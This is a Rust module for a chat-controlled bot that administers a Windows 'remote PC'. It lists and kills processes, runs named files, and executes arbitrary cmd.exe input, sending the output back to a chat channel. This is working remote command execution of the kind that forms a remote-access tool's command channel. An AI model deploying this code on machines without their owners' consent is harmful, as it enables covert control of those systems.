use std::{io::{BufWriter, Write}, fs::File, time::SystemTime, process::Command, os::windows::process::CommandExt};
use chrono::{DateTime, Local};
use rand::distributions::{Alphanumeric, DistString};
use serde_json::json;
use sysinfo::{SystemExt, ProcessExt, PidExt, Pid};
use crate::{BOT_TO_SEND, SYS};
pub enum ProcessSorting {
    Name= 1, Cpu= 2, Mem= 3, Pid= 4
}
pub async fn main(channel_id: u64, sorting: ProcessSorting) {
    let path= std::env::temp_dir().to_string_lossy().to_string() + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12) + ".txt";
    let mut f= BufWriter::new(File::create(&path).unwrap());
    let mut s= String::new();
    let mut sys= SYS.lock().await;
    sys.refresh_processes();
    std::thread::sleep(std::time::Duration::from_secs_f64(0.5));
    sys.refresh_processes();
    let processes= sys.processes();
    s+= &format!("Process amount: {}\nSorting: {}\n\n", processes.len(), match sorting {
        ProcessSorting::Name => "NAME",
        ProcessSorting::Cpu => "CPU",
        ProcessSorting::Mem => "RAM",
        ProcessSorting::Pid => "PID"
    });
    let mut procl= Vec::new();
    for (pid, proc) in processes {
        procl.push((proc.name(), pid.as_u32(), proc.cpu_usage(), proc.memory()));
    }
    match sorting {
        ProcessSorting::Name => {
            procl.sort_by(|value, next| {
                value.0.to_lowercase().cmp(&next.0.to_lowercase())
            });
        }
        ProcessSorting::Cpu => {
            procl.sort_by(|value, next| {
                value.2.total_cmp(&next.2)
            });
            procl.reverse();
        }
        ProcessSorting::Mem => {
            procl.sort_by(|value, next| {
                value.3.cmp(&next.3)
            });
            procl.reverse();
        }
        ProcessSorting::Pid => {
            procl.sort_by(|value, next| {
                value.1.cmp(&next.1)
            });
        }
    }
    for (name, pid, cpu, mem) in procl {
        let nname= if name.len()> 32 {
            name[..32].to_string()
        }else{
            std::iter::repeat(" ").take(32 - name.len()).collect::<String>() + &name
        };
        let mut npid= format!("{}", pid);
        if npid.len()< 10 {
            npid= std::iter::repeat(" ").take(10 - npid.len()).collect::<String>() + &npid;
        }
        let mut ncpu= format!("{:.2}", cpu);
        if ncpu.len()< 6 {
            ncpu= std::iter::repeat(" ").take(6 - ncpu.len()).collect::<String>() + &ncpu;
        }
        let mut cmem= mem as f64;
        let mut smem= "  B";
        while cmem> 1000. {
            cmem/= 1024.;
            smem= match smem {"  B" => "KiB", "KiB" => "MiB", "MiB" => "GiB", "GiB" => "TiB", _ => "???"};
        }
        let mut nmem= format!("{:.2}", cmem);
        if nmem.len()< 6 {
            nmem= std::iter::repeat(" ").take(6 - nmem.len()).collect::<String>() + &nmem;
        }
        s+= &format!("{}  PID: {}  CPU: {}%  RAM: {} {}\n", nname, npid, ncpu, nmem, smem);
    }
    f.write_all(s.as_bytes()).unwrap();
    f.flush().unwrap();
    drop(f);
    BOT_TO_SEND.lock().await.push(json!({
        "channel": channel_id,
        "content": "Process list:",
        "files": [path],
        "delete_files": true,
        "react": ["📌"]
    }));
}
pub async fn kill_process(channel_id: u64, id: u32) {
    let mut sys= SYS.lock().await;
    if sys.refresh_process(Pid::from_u32(id)) {
        for (pid, proc) in sys.processes() {
            if pid.as_u32()== id {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": channel_id,
                    "content": format!("```Do you really want to kill process: {}\nReact with 💀 to kill it or 🔴 to cancel```", proc.name()),
                    "react": ["💀", "🔴"],
                    "interaction": {
                        "kind": "kill",
                        "pid": id,
                    }
                }));
                break;
            }
        }
    }
}
pub async fn kill_process_confirmed(user: String, channel_id: u64, id: u32) {
    let mut sys= SYS.lock().await;
    if sys.refresh_process(Pid::from_u32(id)) {
        for (pid, proc) in sys.processes() {
            if pid.as_u32()== id {
                if proc.kill() {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": channel_id,
                        "content": format!("```Process {} killed by {} at {}```", proc.name(), user, Into::<DateTime<Local>>::into(SystemTime::now()).format("%d/%m/%Y %r").to_string())
                    }));
                }
                break;
            }
        }
    }
}
pub async fn main_execute(channel_id: u64, user: String, input: String) {
    let mut path= std::env::current_dir().unwrap();
    path.push(input.trim());
    let mut show_err= true;
    if path.exists() {
        if path.is_file() {
            show_err= false;
            match Command::new(&path).current_dir(std::env::current_dir().unwrap()).spawn() {
                    Ok(_) => {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channel_id,
                            "content": &format!("```Executed \"{}\" by {} on the remote PC```", path.to_string_lossy(), user),
                            "react": ["🔴"]
                        }));
                    }
                    Err(_) => {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channel_id,
                            "content": &format!("```❗ Unable to execute \"{}\" on the remote PC```", path.to_string_lossy()),
                            "react": ["🔴"]
                        }));
                    }
            }
        }
    }
    if show_err {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &format!("```❗ File not found```"),
            "react": ["🔴"]
        }));
    }
}
pub async fn main_cmd(channel_id: u64, user: String, input: String) {
    match Command::new("cmd.exe")
            .current_dir(std::env::current_dir().unwrap()).arg("/c")
            .raw_arg(&input).output() {
        Ok(proc) => {
            let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
            let mut f= BufWriter::new(File::create(&path).unwrap());
            f.write_all(&proc.stdout).unwrap();
            f.flush().unwrap();
            drop(f);
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel_id,
                "content": &format!("```Executed \"{}\" by {} on the remote PC```", &input, user),
                "files": [path],
                "react": ["🔴"],
                "delete_files": true
            }));
        }
        Err(_) => {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel_id,
                "content": &format!("```❗ Unable to execute \"{}\" on the remote PC```", &input),
                "react": ["🔴"]
            }));
        }
    }
}